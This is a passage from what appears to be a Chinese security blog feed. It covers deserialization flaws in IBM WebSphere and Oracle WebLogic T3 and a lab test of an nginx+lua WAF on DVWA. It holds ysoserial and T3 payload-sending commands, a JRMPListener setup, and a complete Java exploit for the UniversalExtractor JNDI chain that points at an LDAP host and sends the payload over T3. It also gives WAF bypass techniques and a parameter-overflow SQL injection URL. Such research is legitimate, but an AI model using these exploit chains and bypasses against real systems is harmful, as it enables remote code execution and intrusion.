href="https://www.ibm.com/support/knowledgecenter/ru/SSAW57_8.5.5/com.ibm.websphere.nd.multiplatform.doc/ae/twsf_devwes.html。按如下编写能够将设定的`operation=&gt;&quot;getAddressFromName&quot;`、`classname=&gt;WSIFAdressBook`、`methodName=&gt;&quot;getAddressFromName&quot;`就能够映射到`WSIFAddressBook.getAddressFromName`方法" target="_blank" rel="noopener">https://www.ibm.com/support/knowledgecenter/ru/SSAW57_8.5.5/com.ibm.websphere.nd.multiplatform.doc/ae/twsf_devwes.html。按如下编写能够将设定的`operation=&gt;&quot;getAddressFromName&quot;`、`classname=&gt;WSIFAdressBook`、`methodName=&gt;&quot;getAddressFromName&quot;`就能够映射到`WSIFAddressBook.getAddressFromName`方法</a></p><p><img src="./image-20200815132915803.png" srcset="/img/loading.gif" alt="image-20200815132915803"></p><p>由于该处需要调用<code>operation=&gt;findByPrimaryKey</code>可以编写映射到<code>method=&gt;eval</code>，并且编写<code>classname=&gt;javax.el.ELProcessor</code>.就能够执行执行方法<code>javax.el.ELProcessor.eval()</code>方法.args参数值由反序列化时构造的<code>this.key</code>字段.</p><p><img src="./image-20200815133515861.png" srcset="/img/loading.gif" alt="image-20200815133515861"></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="./image-20200815133846623.png" srcset="/img/loading.gif" alt="image-20200815133846623"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a href="https://www.ibm.com/support/pages/node/6220276" target="_blank" rel="noopener">https://www.ibm.com/support/pages/node/6220276</a></p><p>删除<code>WSIFPort_EJB.readObject</code>方法中的<code>handle.getEJBObject</code></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html" target="_blank" rel="noopener">https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/ru/SSAW57_8.5.5/com.ibm.websphere.nd.multiplatform.doc/ae/twsf_devwes.html" target="_blank" rel="noopener">https://www.ibm.com/support/knowledgecenter/ru/SSAW57_8.5.5/com.ibm.websphere.nd.multiplatform.doc/ae/twsf_devwes.html</a></p><p><a href="https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzA0ODUwNw==&amp;mid=2247485139&amp;idx=1&amp;sn=8a57a5382cee3d5e182d7f1e443adf7f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4MzA0ODUwNw==&amp;mid=2247485139&amp;idx=1&amp;sn=8a57a5382cee3d5e182d7f1e443adf7f&amp;scene=21#wechat_redirect</a></p><p><a href="https://my.oschina.net/u/4600927/blog/4476917" target="_blank" rel="noopener">https://my.oschina.net/u/4600927/blog/4476917</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WebSphere</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic T3反序列化历史漏洞(一)</title>
    <link href="/2020/08/10/Weblogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E4%B8%80/"/>
    <url>/2020/08/10/Weblogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    文章详细分析了Weblogic历史从CVE-2015至CVE-2019相关历史漏洞，并整理相关POC于<a href="https://github.com/zhzhdoai/Weblogic_Vuln.git" target="_blank" rel="noopener">Weblogic_Vuln</a>.记录学习Java反序列化漏洞的心得笔记.</p><h1 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code class="hljs routeros">Oracle WebLogic<span class="hljs-built_in"> Server </span>12.2.1.0Oracle WebLogic<span class="hljs-built_in"> Server </span>12.1.3.0Oracle WebLogic<span class="hljs-built_in"> Server </span>12.1.2.0Oracle WebLogic<span class="hljs-built_in"> Server </span>10.3.6.0</code></pre><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>测试环境：10.3.6.0 jdk7u21 debian</p><p>利用t3协议通信反序列化CC链，简化栈如下。</p><pre><code class="hljs java">InboundMsgAbbrev.readObject() -&gt; ... -&gt; AnnotationInvocationHandler.readObject() -&gt; AnnotationInvocationHandler.invoke() -&gt; LazyMap.get() -&gt; .... -&gt; Runtime.exec()</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 <span class="hljs-string">"open /System/Applications/Calculator.app"</span> &gt; <span class="hljs-string">"/tmp/tm.ser"</span>python weblogic_t3.py 127.0.0.1 7001 /tmp/tm.ser</code></pre><p><img src="./image-20200805001625974.png" srcset="/img/loading.gif" alt="image-20200805001625974"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>关注反序列化中间过程，利用 <code>LazyMap</code>链进行反序列化，载体套用<code>AnnotationInvocationHandler</code>类，<code>this.memberValues</code>可控为<code>LazyMap</code>类。利用代理机制，在执行<code>entrySet</code>方法使用会优先执行<code>invoke</code>方法</p><p><img src="./image-20200804235543594.png" srcset="/img/loading.gif" alt="image-20200804235543594"></p><p>接着触发<code>LazyMap.get</code>方法,this.factory可控<code>ChainedTransformer</code>类,最后反射执行<code>Runtime.getRuntime.exec(&#39;xxx&#39;)</code>.</p><p><img src="./image-20200804235834751.png" srcset="/img/loading.gif" alt="image-20200804235834751"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><code>resolveClass</code>拦截反序列化的类，将<em>org.apache.commons.collections.functors</em>添加进黑名单。应用位置如下</p><pre><code class="hljs java">weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStreamweblogic.rjvm.MsgAbbrevInputStream<span class="hljs-class">.<span class="hljs-keyword">class</span></span><span class="hljs-class"><span class="hljs-title">weblogic</span>.<span class="hljs-title">iiop</span>.<span class="hljs-title">Utils</span>.<span class="hljs-title">class</span></span></code></pre><h1 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code class="hljs routeros">Oracle WebLogic<span class="hljs-built_in"> Server </span>12.2.1.0Oracle WebLogic<span class="hljs-built_in"> Server </span>12.1.3.0Oracle WebLogic<span class="hljs-built_in"> Server </span>12.1.2.0Oracle WebLogic<span class="hljs-built_in"> Server </span>10.3.6.0</code></pre><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>测试环境：10.3.6.0 jdk7u21 debian</p><p>利用StreamMessageImpl封装的CommonsCollections1恶意利用链,使恶意类反序列化在StreamMessageImpl.readExternal中进行，不在<code>weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream</code>中反序列化，以此绕过补丁</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>重写<code>writeExternal</code>类，以此构造出符合<code>readExternal</code>反序列化的数据流。<code>exp.getObject</code>就是<code>CommonsCollections1</code>最终构造的对象,弹个计算机</p><p><img src="./image-20200810151136398.png" srcset="/img/loading.gif" alt="image-20200810151136398"></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>StreamMessageImpl.readExternal</code>中调用<code>readObject</code>反序列化数据流.针对var1反序列化的条件有</p><ol><li>判断读取的第一个字节是否为1</li><li><code>PayloadFactoryImpl.ceatePaload</code>方法中需要读取到var1(恶意类数据流)的长度.</li></ol><p><img src="./image-20200810152202349.png" srcset="/img/loading.gif" alt="image-20200810152202349"></p><p>所以依据此我们可以进行<code>StreamMessageImpl.writeExternal</code>进行重写.</p><pre><code class="hljs java">    var3.writeObject(exp.getObject()); <span class="hljs-comment">// 传入CommonsCollections1</span>var1.writeByte(<span class="hljs-number">1</span>); <span class="hljs-comment">// 第一个字符写入字符1</span>    var1.writeInt(var5.length); <span class="hljs-comment">// 写入恶意类数据流长度</span></code></pre><p><img src="./image-20200810152533077.png" srcset="/img/loading.gif" alt="image-20200810152533077"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h1><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code class="hljs routeros">Oracle WebLogic<span class="hljs-built_in"> Server </span>12.2.1.0Oracle WebLogic<span class="hljs-built_in"> Server </span>12.1.3.0Oracle WebLogic<span class="hljs-built_in"> Server </span>12.1.2.0Oracle WebLogic<span class="hljs-built_in"> Server </span>10.3.6.0</code></pre><h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>MarshalledObject调用构造方法中存在序列化操作，且该对象中存在<code>readResolve</code>方法能够在反序列化时被调用且反序列化数据流可控.</p><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="./image-20200810155349570.png" srcset="/img/loading.gif" alt="image-20200810155349570"></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>跟进<code>MarshalledObject.readResolve</code>方法.其中对<code>this.objBytes</code>调用<code>readObject</code>方法反序列化</p><p><img src="./image-20200810155449702.png" srcset="/img/loading.gif" alt="image-20200810155449702"></p><p>回溯如何构造<code>this.objBytes</code>,发现是在创建<code>MarshalledObject</code>对象时候，可以直接插入恶意类生成序列化数据流</p><p><img src="./image-20200810155601392.png" srcset="/img/loading.gif" alt="image-20200810155601392"></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h1><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code class="hljs routeros">WebLogic<span class="hljs-built_in"> Server </span>10.3.6.0WebLogic<span class="hljs-built_in"> Server </span>12.1.3.0WebLogic<span class="hljs-built_in"> Server </span>12.2.1.3</code></pre><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code class="hljs bash">测试环境：10.3.6.0 + jdk7u211.vps开启JRMPListenerjava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8000 Jdk7u21 <span class="hljs-string">"open /System/Applications/Calculator.app"</span>2. T3协议利用python weblogic_t3.py 127.0.0.1 7001 /tmp/cve-2019.2890.ser</code></pre><p><img src="./image-20200810135823343.png" srcset="/img/loading.gif" alt="image-20200810135823343"></p><h2 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>PersistentContext</code>在序列化时候能够写入恶意类对象,在反序列化时<code>PersistentContext</code>对象调用<code>readObject</code>时对<code>PersistentContext</code>封装的序列化对象再次反序列化，可以绕过黑名单的限制</p><p><img src="./image-20200810140747794.png" srcset="/img/loading.gif" alt="image-20200810140747794"></p><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该分析主要针对，由于直接复制<code>PersistentContext</code>类进行构造,中间会出现一些问题</p><p>1.实例化对象时会会调用<code>SecurityServiceManager.isKernelIdentity</code>进行判断，由于不影响<code>writeObject</code>对象创建直接注释掉即可.</p><p><img src="./image-20200810114116364.png" srcset="/img/loading.gif" alt="image-20200810114116364"></p><p>2.获取KERNEL_ID时候，网上师傅的文章发现生成序列化时候卡住，在调试时并没有出现该情况.测试的版本在调用<code>SubjectManager.getSubjectManager</code>方法代码如下.</p><p><img src="./image-20200810115907099.png" srcset="/img/loading.gif" alt="image-20200810115907099"></p><p><img src="./image-20200810120053655.png" srcset="/img/loading.gif" alt="image-20200810120053655"></p><ol start="3"><li>在反序列化时，需要进行解密。所以在调用<code>writeSubjec</code>写入时需要执行<code>EncryptionUtil.encrypt</code>对数据流进行加密.且加密条件需要本机的<code>SerializedSystemIni.dat</code>文件</li></ol><p><img src="./image-20200810135333015.png" srcset="/img/loading.gif" alt="image-20200810135333015"></p><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><code>resolveClass</code>中验证反序列化类是否为<code>Subject</code>子类</p><h1 id="CVE-2017-CVE-2018"><a href="#CVE-2017-CVE-2018" class="headerlink" title="CVE-2017~CVE-2018"></a>CVE-2017~CVE-2018</h1><p>CVE-2017至2018更多是替换恶意类绕过补丁，不在赘述</p><h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>MarshalledObject+JRMP</p><p>Apache Commons Colletions基础漏洞修复，与CVE-2016-3510利用相同不过恶意类替换为JRMP,利用<code>java.rmi.registry.Registry</code>.</p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>MarshalledObject+JRMP</p><p><code>java.rmi.registry.Registry</code>替换为<code>java.rmi.activation.Activator</code>,绕过resolveProxyClass判断</p><h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>cve-2017-0638 + cve-2017-3248即<code>StreamMessageImpl</code>中封装<code>JRMPClient</code>。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li><p>Weblogic利用T3协议反序列化，大多数是利用类封装恶意类绕过补丁(<code>resolveClass</code>).</p><ol start="2"><li><p>在构造恶意类时可以重写<code>writeObject/writeExternal</code>方法.需要传入恶意类数据流的长度</p></li><li><p>关于JRMP类可以实现自己打自己可以参考<a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a></p></li><li><p>IDEA中进行低版本编译File-&gt;Project Structure-&gt;Project language level中选择</p></li></ol></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.jianshu.com/p/38033935a914" target="_blank" rel="noopener">https://www.jianshu.com/p/38033935a914</a></p><p><a href="https://www.cnblogs.com/afanti/p/10240232.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/10240232.html</a></p><p><a href="https://paper.seebug.org/333/" target="_blank" rel="noopener">https://paper.seebug.org/333/</a></p><p><a href="https://xz.aliyun.com/search?keyword=weblogic" target="_blank" rel="noopener">https://xz.aliyun.com/search?keyword=weblogic</a></p><p><a href="https://www.cnblogs.com/afanti/p/10240232.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/10240232.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weblogic T3反序列化[UniversalExtractor]JNDI注入(附Exp)</title>
    <link href="/2020/07/17/weblogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-UniversalExtractor-JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-%E9%99%84Exp/"/>
    <url>/2020/07/17/weblogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-UniversalExtractor-JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-%E9%99%84Exp/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> Exp &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        JdbcRowSetImpl JdbcRowSetImpl1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JdbcRowSetImpl()</span>;        Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JdbcRowSetImpl</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Superclass()</span>;        Field setDataSource = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">"dataSource"</span>)</span>;        setDataSource.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        setDataSource.set(JdbcRowSetImpl1,<span class="hljs-string">"ldap://xxxxx"</span>);        UniversalExtractor UniversalExtractor1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UniversalExtractor(<span class="hljs-string">"isEmpty()"</span>,<span class="hljs-params">new</span> Object[]&#123;&#125;)</span>;        Field setname = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UniversalExtractor1</span>.</span></span>get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">"m_sName"</span>)</span>;        setname.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        PriorityQueue queue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PriorityQueue(2, <span class="hljs-params">new</span> ExtractorComparator(UniversalExtractor1)</span>);        queue.add(<span class="hljs-string">"1"</span>);        queue.add(<span class="hljs-string">"1"</span>);        Object<span class="hljs-literal">[]</span> queueArray = (Object<span class="hljs-literal">[]</span>) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reflections</span>.</span></span>get<span class="hljs-constructor">FieldValue(<span class="hljs-params">queue</span>, <span class="hljs-string">"queue"</span>)</span>;        queueArray<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> = JdbcRowSetImpl1;        queueArray<span class="hljs-literal">[<span class="hljs-number">1</span>]</span> = <span class="hljs-string">"1"</span>;        setname.set(UniversalExtractor1,<span class="hljs-string">"DatabaseMetaData"</span>);        <span class="hljs-comment">// serialize</span>        byte<span class="hljs-literal">[]</span> payload = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Serializables</span>.</span></span>serialize(queue);        <span class="hljs-comment">// T3 send, you can also use python weblogic_t3.py test.ser</span>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">T3ProtocolOperation</span>.</span></span>send(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-string">"7001"</span>, payload);        <span class="hljs-comment">// test</span>        serialize(queue);    &#125;    public static void serialize(Object obj) &#123;        <span class="hljs-keyword">try</span> &#123;            ObjectOutputStream os = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">new</span> FileOutputStream(<span class="hljs-string">"test.ser"</span>)</span>);            os.write<span class="hljs-constructor">Object(<span class="hljs-params">obj</span>)</span>;            os.close<span class="hljs-literal">()</span>;        &#125; catch (Exception e) &#123;            e.print<span class="hljs-constructor">StackTrace()</span>;        &#125;    &#125;    public static void deserialize<span class="hljs-literal">()</span> &#123;        <span class="hljs-keyword">try</span> &#123;            ObjectInputStream is = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">new</span> FileInputStream(<span class="hljs-string">"test.ser"</span>)</span>);            is.read<span class="hljs-constructor">Object()</span>;        &#125; catch (Exception e) &#123;            e.print<span class="hljs-constructor">StackTrace()</span>;        &#125;    &#125;&#125;</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx+lua防火墙实践笔记</title>
    <link href="/2020/06/16/nginx-lua%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E8%B7%B5%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/06/16/nginx-lua%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E8%B7%B5%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>^_^</code></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="openresty安装"><a href="#openresty安装" class="headerlink" title="openresty安装"></a>openresty安装</h2><pre><code class="hljs bash">yum install yum-utilsyum-config-manager --add-repo https://openresty.org/package/centos/openresty.repoyum install openrestyyum install openresty-resty</code></pre><p>nginx加载环境变量中</p><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"export PATH=<span class="hljs-variable">$PATH</span>:/usr/local/openresty/nginx/sbin"</span> &gt;&gt; /etc/profile<span class="hljs-built_in">source</span> /etc/profile</code></pre><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre><code class="hljs bash">yum install epel-release<span class="hljs-comment"># Extra Packages for Enterprise Linux 。EPEL是一个比官方rpm包更丰富、版本相对更高的额外第三方源</span>yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm<span class="hljs-comment"># 除了EPEL源之外还有REMI的源。它包含最新版本 PHP 和 MySQL 包</span>yum --enablerepo=remi-php70 install php <span class="hljs-comment"># yum --enablerepo=[repo]   启用一个或多个软件源(支持通配符)</span>yum --enablerepo=remi-php70 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-devel php-mysql php-gd php-bcmath php-pdo php-pecl-imagick php-fpm -y <span class="hljs-comment"># 卸载命令：yum --enablerepo=remi-php73 remove xxx xxx ..</span></code></pre><p>开启php-fpm</p><pre><code class="hljs bash">systemctl start php-fpm</code></pre><h2 id="mariadb"><a href="#mariadb" class="headerlink" title="mariadb"></a>mariadb</h2><pre><code class="hljs bash">yum install mariadb-serversystemctl start mariadb</code></pre><p>修改密码</p><pre><code class="hljs bash">mysql -uroot -p<span class="hljs-built_in">set</span> password=password(<span class="hljs-string">'root'</span>);flush privileges</code></pre><h2 id="更改nginx配置文件解析php"><a href="#更改nginx配置文件解析php" class="headerlink" title="更改nginx配置文件解析php"></a>更改nginx配置文件解析php</h2><pre><code class="hljs json">location ~ \.php$ &#123;    root           html;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;    include        fastcgi_params;&#125;</code></pre><p>启动nginx</p><pre><code class="hljs bash">nginx -c /usr/<span class="hljs-built_in">local</span>/openresty/nginx/conf/nginx.confnginx -s reload</code></pre><p><img src="./image-20200615222554234.png" srcset="/img/loading.gif" alt="image-20200615222554234"></p><h2 id="解决WEB应用权限问题"><a href="#解决WEB应用权限问题" class="headerlink" title="解决WEB应用权限问题"></a>解决WEB应用权限问题</h2><pre><code class="hljs bash">setenforce 0 <span class="hljs-comment"># 临时关闭</span>sed -i <span class="hljs-string">"s#SELINUX=enforcing#SELINUX=disabled#g"</span> /etc/selinux/config <span class="hljs-comment"># 永久关闭</span></code></pre><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>项目使用DVWA,配置网上都有，改完配置记得重启php-fpm、nginx</p><h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><h2 id="编辑nginx-conf"><a href="#编辑nginx-conf" class="headerlink" title="编辑nginx.conf"></a>编辑nginx.conf</h2><p>[waf下载地址](git clone <a href="https://github.com/unixhot/waf.git" target="_blank" rel="noopener">https://github.com/unixhot/waf.git</a>)</p><p><img src="./image-20200616001045090.png" srcset="/img/loading.gif" alt="image-20200616001045090"></p><p>加载waf后，重启服务器<code>nginx -s reload</code></p><pre><code class="hljs bash">lua_load_resty_core off;lua_shared_dict <span class="hljs-built_in">limit</span> 50m;  <span class="hljs-comment">#防cc使用字典，大小50M</span>lua_package_path <span class="hljs-string">"/usr/local/openresty/nginx/conf/waf/?.lua"</span>;init_by_lua_file <span class="hljs-string">"/usr/local/openresty/nginx/conf/waf/init.lua"</span>;access_by_lua_file <span class="hljs-string">"/usr/local/openresty/nginx/conf/waf/access.lua"</span>;</code></pre><p><img src="./image-20200616000754100.png" srcset="/img/loading.gif" alt="image-20200616000754100"></p><h2 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h2><p><img src="./image-20200616001804451.png" srcset="/img/loading.gif" alt="image-20200616001804451"></p><p><img src="./image-20200616001207398.png" srcset="/img/loading.gif" alt="image-20200616001207398"></p><h3 id="SQL-rule"><a href="#SQL-rule" class="headerlink" title="SQL rule"></a>SQL rule</h3><p>规则写的有点次</p><p><img src="./image-20200616001141152.png" srcset="/img/loading.gif" alt="image-20200616001141152"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>规则其实bug挺多的，举几个如下</p><p><code>select.+(from|limit</code>可以用大小写绕过</p><p><code>information_schema</code>可以用mysql 5.7下特殊的字段绕过</p><h1 id="反射XSS测试"><a href="#反射XSS测试" class="headerlink" title="反射XSS测试"></a>反射XSS测试</h1><p>看规则是防御相应的标签，但是并没有过滤完整。可以按照实际生产环境对增加一些危险字符如,更安全的方法是在web应用上进行html编码.</p><pre><code class="hljs bash">/,\,`,<span class="hljs-string">",'</span></code></pre><h2 id="XSS-rule"><a href="#XSS-rule" class="headerlink" title="XSS rule"></a>XSS rule</h2><p><img src="./image-20200616002452905.png" srcset="/img/loading.gif" alt="image-20200616002452905"></p><p>测试<code>&lt;script</code>标签</p><p><img src="./image-20200616002422969.png" srcset="/img/loading.gif" alt="image-20200616002422969"></p><p>日志</p><p><img src="./image-20200616003340276.png" srcset="/img/loading.gif" alt="image-20200616003340276"></p><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><p>大小写,空格等利用javascirpt语法特性</p><pre><code class="hljs javascript">&lt;svg标签</code></pre><h1 id="CVE-2018-9230"><a href="#CVE-2018-9230" class="headerlink" title="CVE-2018-9230"></a>CVE-2018-9230</h1><p>查一查OpenResty框架有没有现成的cve</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>该CVE利用参数溢出，只会处理前100个传入的参数，不会处理第101个参数</p><p><img src="./image-20200616005623234.png" srcset="/img/loading.gif" alt="image-20200616005623234"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>直接传入<code>select from</code>未被拦截,利用报错注入</p><pre><code class="hljs url">http:&#x2F;&#x2F;localhost&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a0&#x3D;0&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a1&#x3D;1&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a2&#x3D;2&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a3&#x3D;3&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a4&#x3D;4&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a5&#x3D;5&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a6&#x3D;6&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a7&#x3D;7&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a8&#x3D;8&amp;a9&#x3D;9&amp;a9&#x3D;9&amp;a9&#x3D;9&amp;a9&#x3D;9&amp;a9&#x3D;9&amp;a9&#x3D;9&amp;a9&#x3D;9&amp;a9&#x3D;9&amp